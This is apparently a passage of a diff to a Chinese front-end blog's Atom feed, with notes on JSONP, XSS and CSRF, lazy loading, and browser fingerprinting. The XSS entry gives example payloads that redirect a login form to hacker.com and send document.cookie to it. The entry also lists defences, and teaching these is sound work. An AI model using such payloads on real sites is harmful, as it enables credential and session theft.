-<p>B.<br>使用fingerprint.js包，它是一个可以根据浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，<br>然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器</p>
-<p>由未登录到登录态要做的事情就要注意两个账号的关联</p>
-<p>奇葩问题：在一台设备登录过多个账号的情况下，怎样进行未登录数据的关联<br>首先设备一般会让你先退出再登录另一个账号,<br>即便要登录多个账号,要做关联，在第一个用户登录后就关联完了，后面多个再登录已经不再是由未登录到登录状态了</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;正常情况下身份识别&quot;&gt;&lt;a href=&quot;#正常情况下身份识别&quot; class=&quot;headerlink&quot; title=&quot;正常情况下身份识别&quot;&gt;&lt;/a&gt;正常情况下身份识别&lt;/h1&gt;&lt;p&gt;用户提交登录信息，服务器拿到登录信息进行验证之后，&lt;br&gt;为该用户在session表
-    
-    </summary>
-    
-    
-      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>关于jsonp</title>
-    <link href="http://yoohannah.github.io/post/knowledge/jsonp.html"/>
-    <id>http://yoohannah.github.io/post/knowledge/jsonp.html</id>
-    <published>2017-11-30T23:57:15.000Z</published>
-    <updated>2017-12-01T00:00:51.317Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="关于jsonp"><a href="#关于jsonp" class="headerlink" title="关于jsonp"></a>关于jsonp</h1><p>是一种json数据的使用模式的名称，<br>获取的资料可以是任意js</p>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.在script标签中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.xxxx.com/myService.aspx?param=senddata&amp;jsonp=callbackFunction&quot;&gt;&lt;/script&gt;</div><div class="line"></div><div class="line">js:</div><div class="line">function callbackFunction(result,methodName)&#123;&#125;</div></pre></td></tr></table></figure></p>
-<p>服务端提供的js脚本会根据param=senddata等查询条件过滤数据，根据jsonp=callbackFunction，动态生成callbackFunction函数，把要传递的数据以参数形式传递进去<br>例，这里服务端js会生成如下语句供回调<br>callbackFunction(data1,dat2),data1,data2即传递的数据<br>2.在ajax中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$.ajax(&#123;</div><div class="line">dataType:&apos;jsonp&apos;,</div><div class="line">data:&apos;id=10&apos;,</div><div class="line">jsonp:&apos;jsonp_callback&apos;,</div><div class="line">url:&apos;http://www.xxxxx.com/getdata&apos;,</div><div class="line">success:function(data)&#123;</div><div class="line">//dostuff</div><div class="line">&#125;,</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
-<p>可以直接的success回调函数中使用数据进行处理<br>3.在$.get中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$.get(</div><div class="line">&apos;http://xxxxxx.com/services.php?callback=?&apos;,</div><div class="line">&#123;</div><div class="line">	param: data,  //参数</div><div class="line">	function (json) &#123; //dosomething &#125;,  //回调函数，?会替换为这里</div><div class="line">  &apos;jsonp&apos;</div><div class="line">);</div></pre></td></tr></table></figure></p>
-<p>4.在$get.json中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$.getJSON(&quot;http://xxxxx.com/services?param1=data1&amp;param1=data2&amp;format=json&amp;jsoncallback=?&quot;,</div><div class="line">function(data)&#123; //回调函数</div><div class="line">//dosomething</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;关于jsonp&quot;&gt;&lt;a href=&quot;#关于jsonp&quot; class=&quot;headerlink&quot; title=&quot;关于jsonp&quot;&gt;&lt;/a&gt;关于jsonp&lt;/h1&gt;&lt;p&gt;是一种json数据的使用模式的名称，&lt;br&gt;获取的资料可以是任意js&lt;/p&gt;
-&lt;h1 id=&quot;使用&quot;
-    
-    </summary>
-    
-    
-      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XSS 与 CSRF</title>
-    <link href="http://yoohannah.github.io/post/knowledge/XSSCSRF.html"/>
-    <id>http://yoohannah.github.io/post/knowledge/XSSCSRF.html</id>
-    <published>2017-11-30T23:56:15.000Z</published>
-    <updated>2018-03-24T01:24:19.001Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在页面HTML注入js代码，获取页面信息，再将信息传递到攻击者站点</p>
-<h2 id="注入js方法"><a href="#注入js方法" class="headerlink" title="注入js方法"></a>注入js方法</h2><p>1.直接将获取信息的代码放在<script></script>标签里面，利用拼接html的过程，将攻击代码注入到HTML<br>2.将攻击代码代码放在攻击者站点里面,利用script标签src属性,将文件引入<br>3.利用页面标签事件属性，攻击代码以触发函数的形式注入，标签事件触发同时触发获取信息的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">//例1.原本访问www.original.com/login?id=maya,实现自动将maya赋值到ID输入框里面</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;maya&apos;&gt;</div><div class="line">//但如果在访问的同时注入攻击代码，如下</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&apos;login&apos;);+f.action=&apos;http://hacker.com/pwee&apos;;+f.method=&apos;get&apos;;&lt;/script&gt;&quot;</div><div class="line">//页面代码就会变成</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;&apos;&gt;&lt;script&gt;var f=document.getElementById(&apos;login&apos;); f.action=&apos;http://hacker.com/pwee&apos;; f.method=&apos;get&apos;;&lt;/script&gt;</div><div class="line">//登录按钮的id为login，即用户输入id,密码，等登录信息后点击登录按钮时，不仅会向正常的登录网站www.original.com发送登录信息,</div><div class="line">//同时会向http://hacker.com站点发送登录信息,攻击者即得到用户的登录信息，如果是支付页面，即可以得到支付密码</div><div class="line"></div><div class="line">//例2.获取用户登录态cookie的攻击代码xss.js放在攻击者的站点,如下</div><div class="line">var content = escape(document.cookie) //escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</div><div class="line">document.write(&quot;&lt;img src=&apos;http://hacker.com/?&apos;&quot;);</div><div class="line">document.write(content);</div><div class="line">document.write(&apos;&gt;&apos;);</div><div class="line">//本次代码注入的方式变为访问</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script src=&apos;http://hacker.com/xss.js&apos;&gt;&lt;/script&gt;&quot;</div><div class="line">就会执行xss.js的代码，将用户cookie通过img的src发出的请求送到hacker站点</div><div class="line"></div><div class="line">//例3. form表单提交时，给提交按钮添加触发事件，触发函数即注入的攻击代码</div><div class="line">&lt;input type=&apos;submit&apos; onclick=&apos;hacker()&apos;&gt;</div><div class="line">//如果需要用户无察觉的触发，可使用onmousemove、onload等事件进行触发</div></pre></td></tr></table></figure></p>
-<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对代码进行漏洞检查；<br>对特殊字符进行encode;<br>对富文本进行白名单处理;<br>在js里面不要用eval,innerHTML；<br>在response头部的set-cookie中添加httponly,不允许脚本操作document.cookie;</p>
-<p>对特殊字符进行encode<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ’ 替换成 &#39;<br>把 ’ 替换成 &quot;<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</p>
-<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击站点通过用户触发攻击代码获取登录态，伪造用户身份向源站请求资源或发送信息</p>
-<p><img src="/image/csrf.png" alt="csrf"><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">相关链接</a></p>
-<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;xss-跨站脚本攻击&quot;&gt;&lt;a href=&quot;#xss-跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;xss 跨站脚本攻击&quot;&gt;&lt;/a&gt;xss 跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerli
-    
-    </summary>
-    
-    
-      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>懒加载</title>
-    <link href="http://yoohannah.github.io/post/knowledge/lazyload.html"/>
-    <id>http://yoohannah.github.io/post/knowledge/lazyload.html</id>
-    <published>2017-11-30T23:55:15.000Z</published>
-    <updated>2018-01-21T13:42:15.021Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="lazy"><a href="#lazy" class="headerlink" title="lazy"></a>lazy</h1><h2 id="图片lazyload"><a href="#图片lazyload" class="headerlink" title="图片lazyload"></a>图片lazyload</h2><p>基本原理是图片image标签的src属性在构建DOM时，先给一特定的默认值，可以是本地图片路径，然后通过监听scroll事件，<br>判断图片所在位置是否在可视屏幕里面，如果在可视屏幕里面，就将要加载的真正图片资源给到image的src属性<br>当然通过判断src的值是否是默认值，就可以知道图片是否已经被加载过，加载过就不会被从新赋值，然后重新加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">function lazyload() &#123;</div><div class="line">              const images = document.getElementsByTagName(&apos;img&apos;)</div><div class="line">              const len = images.length</div><div class="line">              let n = 0</div><div class="line">              return function() &#123;</div><div class="line">                  console.log(1)</div><div class="line">                  const seeHeight = document.documentElement.clientHeight</div><div class="line">                  const scrollTop = document.documentElement.scrollTop || document.body.scrollTop</div><div class="line">                  for (let i = n; i &lt; len; i++) &#123;</div><div class="line">                      if (images[i].offsetTop &lt; seeHeight + scrollTop) &#123; //是否在可视范围</div><div class="line">                          if (images[i].getAttribute(&apos;src&apos;) === &apos;默认图片的url&apos;) &#123;</div><div class="line">                              images[i].src = images[i].getAttribute(&apos;data-src&apos;) //赋值资源链接</div><div class="line">                          &#125;</div><div class="line">                          n = n + 1</div><div class="line">                      &#125;</div><div class="line">                  &#125;</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line">          var loadImages = lazyload()</div><div class="line">          window.onload = function () &#123;</div><div class="line">              loadImages()</div><div class="line">              window.addEventListener(&apos;scroll&apos;, loadImages, false)</div><div class="line">          &#125;</div></pre></td></tr></table></figure></p>
-<p>但缺点就是，只要触发了scroll事件，就会去调函数，无论图片有没有被加载，这样就会造成一些没用的调用，所以对此进行改进</p>
-<p>改进方式一：使用节流阀（Throttle）</p>
-<p>响应函数函数在一定时间内只允许被调用一次,函数能否被执行根据时间来确定</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">function throttle(fn, delay, atleast) &#123;</div><div class="line">                let timeout = null</div><div class="line">                let startTime = new Date()</div><div class="line">                return function() &#123;</div><div class="line">                    const curTime = new Date()</div><div class="line">                    clearTimeout(timeout) //3，取消限定时间内预约的将来的函数执行,防止多次执行</div><div class="line">                    if (curTime - startTime &gt;= atleast) &#123;//1,超过限定时间，执行一次</div><div class="line">                        fn()</div><div class="line">                        startTime = curTime</div><div class="line">                    &#125; else &#123;</div><div class="line">                        timeout = setTimeout(fn, delay) //2，没超过限定时间，在限定时间内不执行，延续时间到超过限定时间后再执行</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">var loadImages = lazyload()</div><div class="line">window.onload = function () &#123;</div><div class="line">    loadImages()</div><div class="line">    window.addEventListener(&apos;scroll&apos;, throttle(loadImages, 500, 1000), false)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>改进方式二：使用防抖动技术(debounce)</p>
-<p>当事件发生时，不会立即激活回调。<br>等待一定的时间并检查相同的事件是否再次触发。<br>如果是，重置定时器，并再次等待。<br>如果在等待期间没有发生相同的事件，等待时间结束后就立即激活回调。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function debounced(fn,delay) &#123;</div><div class="line">  clearTimeout(timeoutID);  // reset timer</div><div class="line">  timeoutID = setTimeout(function() &#123;</div><div class="line">    // wait for some time</div><div class="line">    // and check if event happens again</div><div class="line">    fn()</div><div class="line">  &#125;, delay);</div><div class="line">&#125;;</div><div class="line">var loadImages = lazyload()</div><div class="line">window.onload = function () &#123;</div><div class="line">    loadImages()</div><div class="line">    window.addEventListener(&apos;scroll&apos;, debounced(loadImages, 500), false)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="组件的lazyload"><a href="#组件的lazyload" class="headerlink" title="组件的lazyload"></a>组件的lazyload</h2><p>实现一：AMD模式require实现异步加载模块<br>在AMD模式里面每个模块都会被define包裹，对无序的代码进行有序的模块化定义，目的就是为了使js能够按照一定秩序执行，<br>require模块时，会根据模块之间的依赖关系按顺序加载</p>
-<p>实现二：使用require.ensure()方法调用异步模块，配置chunkFilename为异步模块要打包到的地方，webpack打包时，就会根据依赖关系打包成异步加载的模式，在运行时就会异步加载模块</p>
-<p>实现三：将组建都标签化后，通过对标签添加是否异步的标志，从而实现对该组件的异步加载</p>
-<h1 id="预加载技术"><a href="#预加载技术" class="headerlink" title="预加载技术"></a>预加载技术</h1><p>1.提前加载下一页数据<br>2.加载页面时，尽早发出数据请求，实现页面数据预加载</p>
-<h1 id="图片的-base64-编码"><a href="#图片的-base64-编码" class="headerlink" title="图片的 base64 编码"></a>图片的 base64 编码</h1><p>图片的 base64 编码就是可以将一图片数据编码成一串字符串，使用该字符串代替代码中的图像地址<br>图片就可以随着HTML的下载同时下载到本地，不用为了下载图片向服务器发出请求</p>
-<p>将图片转化为Base64编码的工具，可以使用线上网站，也可以用以下方法<br>在 chrome 下打开新的标签页，然后把要转化的图片直接拖入浏览器，打开控制台，点 Source，source的内容内容就是图片base64编码</p>
-<p>可以看到一个图片的base64编码的字符数量一般是很大的，这样，当把图片编码无论是写到css文件还是html文件，<br>都会因为解析时间过长从而造成渲染速度下降，因此将图片进行base64编码最好的应用场景是如下情况：<br><b>如果图片足够小且因为用处的特殊性无法被制作成雪碧图（CssSprites），在整个网站的复用性很高且基本不会被更新</b></p>
-<p><a href="http://www.cnblogs.com/coco1s/p/4375774.html" target="_blank" rel="external">base64 编码</a></p>
-<p>Angular会自动为每个拥有作用域的DOM节点加上 ng-scope 类<br>AngularJs的angular.extend()方法可以把一个或多个对象中的方法和属性扩展到一个目的对象中，使得这个对象拥有其他对象相同的方法和属性<br>angular.extends()方法的第一个参数是要被扩展的对象，后面可以传入一个或多个对象</p>
-<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="优化占位图"><a href="#优化占位图" class="headerlink" title="优化占位图"></a>优化占位图</h2><p>VG元素/提取图片背景色以base64形式直出<br>使用SVG画图形轮廓,再加一个模糊滤镜<br>对图片进行二值化提取剪影</p>
-<h2 id="浏览器渲染图片原理"><a href="#浏览器渲染图片原理" class="headerlink" title="浏览器渲染图片原理"></a>浏览器渲染图片原理</h2><p>构建DOM树，遇到img标签加载图片<br>构建样式树，遇到backgroud-img图片不加载<br>构建render树,所有属性都会构建，如果元素有display:none属性,则其子元素不被构建<br>渲染DOM树,仅渲染没有display:none属性的元素，如果发现元素有该属性则不进行渲染;没有被构建的子元素背景图片不会被加载更不会被加载</p>
-<p>设置了display:none属性的元素，图片不会渲染出来，但会加载，不管是直接的img属性还是div的背景图片都会被加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</div><div class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//加载</div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">  .skslsl&#123;</div><div class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&lt;/style&gt;</div></pre></td></tr></table></figure></p>
-<p>设置了display:none属性元素的子元素，样式表中的背景图片不会渲染出来，也不会加载；而img标签的图片不会渲染出来，但会加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;div style=&quot;display: none;&quot;&gt;</div><div class="line">  &lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</div><div class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//不加载</div><div class="line">&lt;/div&gt;</div><div class="line"></div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">  .skslsl&#123;</div><div class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&lt;/style&gt;</div></pre></td></tr></table></figure></p>
-<p>当触发伪类的时候，伪类样式上的背景图片才会加载。</p>
-<p>重复图片只加载一次，是因为加载一次后，之后的加载均从缓存中读取;<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651552419&amp;idx=2&amp;sn=f799d2d6e4dabe9a9f4c6658a666bcc5&amp;chksm=8025ad62b75224741cc211dc5cd9c0ee8ecef618eb2c35c0caee307465d60e31b7dfd50e08d0&amp;mpshare=1&amp;scene=1&amp;srcid=0115Kms4rvGLhJLnX7FPpZXq&amp;pass_ticket=tyJD73rZ13FVCnO01hd9fVJmLQcKjapRW2yB41zZMwumTsYvs1XDVW5%2BSiBX50%2Bk#rd" target="_blank" rel="external">链接</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;lazy&quot;&gt;&lt;a href=&quot;#lazy&quot; class=&quot;headerlink&quot; title=&quot;lazy&quot;&gt;&lt;/a&gt;lazy&lt;/h1&gt;&lt;h2 id=&quot;图片lazyload&quot;&gt;&lt;a href=&quot;#图片lazyload&quot; class=&quot;headerlink&quot; titl
     
     </summary>
     
